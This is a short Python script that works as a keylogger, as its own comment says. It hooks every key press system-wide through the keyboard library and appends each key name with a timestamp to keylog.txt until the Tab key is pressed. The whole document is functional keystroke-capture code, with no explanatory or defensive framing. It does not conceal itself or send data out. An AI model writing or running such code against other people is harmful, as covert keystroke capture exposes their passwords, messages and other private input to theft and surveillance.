import keyboard
import datetime

log_file = "keylog.txt"  

def write_to_log(event):
    if (event.event_type==keyboard.KEY_DOWN):
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {event.name}\n")
keyboard.hook(write_to_log)
keyboard.wait('tab')  # Change this to the key you want to use to stop the keylogger

    